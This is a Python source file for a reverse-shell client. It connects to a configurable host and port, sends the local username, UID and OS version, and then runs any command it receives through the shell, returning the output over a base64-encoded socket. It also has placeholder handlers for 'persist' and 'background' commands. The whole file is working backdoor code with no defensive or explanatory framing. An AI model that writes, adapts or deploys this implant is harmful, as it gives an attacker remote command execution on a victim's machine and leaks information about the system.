import os
import socket
import subprocess
import pwd
import platform
from time import sleep
import base64

def receive_message(sock):
    try:
        data = sock.recv(1024)
        decoded_data = base64.b64decode(data).decode().strip()
        return decoded_data
    except Exception:
        sock.close()
        return None

def send_message(sock, message):
    encoded_message = base64.b64encode(message.encode('utf-8'))
    sock.send(encoded_message)

def handle_session(sock, host_ip, host_port):
    try:
        sock.connect((host_ip, host_port))
        send_message(sock, pwd.getpwuid(os.getuid())[0])
        send_message(sock, str(os.getuid()))
        sleep(1)
        os_info = platform.uname()
        os_info_str = f'{os_info.system} {os_info.release}'
        send_message(sock, os_info_str)

        while True:
            message = receive_message(sock)
            if message is None:
                break
            
            if message == 'exit':
                break
            elif message == 'persist':
                pass
            elif message.startswith('cd '):
                try:
                    directory = message.split(" ", 1)[1]
                    os.chdir(directory)
                    send_message(sock, os.getcwd())
                except FileNotFoundError:
                    send_message(sock, '[-] Directory not found. Try again.')
                except Exception as e:
                    send_message(sock, f'[-] Error: {str(e)}')
            elif message == 'background':
                pass
            else:
                try:
                    result = subprocess.run(message, shell=True, capture_output=True, text=True)
                    send_message(sock, result.stdout + result.stderr)
                except Exception as e:
                    send_message(sock, f'[-] Command execution error: {str(e)}')

    except ConnectionRefusedError:
        print('[-] Connection refused by the server.')
    except Exception as e:
        print(f'[-] Error: {str(e)}')
    finally:
        sock.close()

if __name__ == '__main__':
    host_ip = '127.0.0.1'
    host_port = 1234
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        handle_session(sock, host_ip, host_port)
